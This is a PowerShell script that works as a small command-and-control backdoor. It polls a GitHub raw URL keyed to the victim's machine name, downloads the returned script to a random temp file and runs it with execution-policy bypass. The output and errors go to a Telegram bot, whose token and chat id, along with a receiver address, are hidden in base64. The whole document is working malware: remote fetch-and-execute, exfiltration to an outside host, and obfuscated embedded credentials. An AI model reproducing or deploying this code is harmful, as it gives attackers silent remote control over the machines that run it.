function Send-ToEmail([string]$email,[string]$body,[string]$subj=[Environment]::MachineName){
    $id = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("MgAwADQANwAyADQAOAA0ADgANwA="))
    $body_json = @{
    "chat_id"= $id
    "text"= "`r<b>$subj</b>`n<code>$body</code>"
    "disable_notification"= "true"
    "parse_mode" = "HTML"
    } | ConvertTo-Json -Depth 4
    $tok = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("NQA0ADUAMwA3ADYANgA4ADEAOQA6AEEAQQBFAFYARgB2AGgAUwBlAEEAMQBZAHMAWABlAHoARgBVAHkAcgBiAGgAVQAyADkAbABlAGoAcwBBADEALQBfAE0AYwA="))
    Invoke-RestMethod -Method 'Post' -Uri "https://api.telegram.org/bot$tok/sendMessage" -Body $body_json -ContentType "application/json"


 }
 function CallMe-Maybe([string] $Url){
    $name = [Environment]::MachineName
    $receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
    $chars = (48..57) + (65..90) + (97..122)
    $file="$env:tmp\$(-join ($chars | Get-Random -Count 7 | ForEach-Object {[char]$_})).ps1"
    try {
        Invoke-WebRequest -Uri $Url -UseBasicParsing -OutFile $file
        $runn = powershell -executionpolicy bypass -file $file 2>&1 | Out-String
        if($?){
            $res=$contentWeb + [Environment]::NewLine + $runn
            $don = "Done - "+$name; Send-ToEmail -email $receiver -body $res -subj $don
        }
    } catch {
        $err = $_ | Out-String
        $suberr = "Error - "+$name
        Send-ToEmail -email $receiver -body $err -subj $suberr
    }
    finally {
        Remove-Item -Path $file -Force
    }
 }
 function Get-UrlStatusCode([string] $Url)
{
    try
    {
        (Invoke-WebRequest -Uri $Url -UseBasicParsing -DisableKeepAlive).StatusCode
    }
    catch [Net.WebException]
    {
        [int]$_.Exception.Response.StatusCode
    }
}
$name = [Environment]::MachineName
$url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
$statusCode = Get-UrlStatusCode $url
if ($statusCode -eq 200){
    $contentLocal = "False"
    $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
    $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
    if(($contentWeb -eq "Online") -or ($contentWeb -eq "Online`n")){
        Send-ToEmail -email $receiver -body $name -subj "Online"
        exit
    }
    elseif($diff) {
        CallMe-Maybe($url)
    }

} elseif ((Get-UrlStatusCode "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/ALL") -eq 200){
    CallMe-Maybe("https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/ALL")

} else {
    Send-ToEmail -email $receiver -body $name -subj "UserNotFound"
}


 
